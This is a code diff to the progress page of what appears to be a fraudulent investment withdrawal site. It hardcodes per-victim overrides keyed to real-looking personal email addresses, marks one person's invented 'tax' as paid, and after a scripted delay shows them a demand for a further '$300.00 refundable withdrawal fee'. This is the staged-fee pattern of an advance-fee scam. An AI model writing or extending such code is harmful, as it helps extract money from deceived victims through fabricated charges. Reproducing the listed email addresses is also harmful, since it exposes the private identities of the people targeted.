@@ -449,9 +449,9 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
   "fabricevahe@gmail.com": {
     currentValue: 8700,
     taxRate: 0.165,
-    taxDue: 1435,
-    taxRemaining: 1435,
-    taxPaid: 0,
+    taxDue: 1435.5,
+    taxPaid: 1435.5,
+    taxRemaining: 0,
     initialHoldings: 700,
     currency: "GBP",
     forceProgressPct: 100,
@@ -1875,6 +1875,11 @@ export default function ProgressPage() {
         setTaxPopup(
           "Congratulations on clearing your taxes. Final step: your GBP 5,000.00 withdrawal is now pending for your transaction to be approved."
         );
+        return;
+      }
+      if (userEmailLower === "fabricevahe@gmail.com") {
+        await new Promise((resolve) => window.setTimeout(resolve, 1200));
+        setTaxPopup("Thank you for clearing tax. A refundable withdrawal fee of $300.00 is now required.");
         return;
       }
       if (userEmailLower === "samlebrun01@gmail.com") {
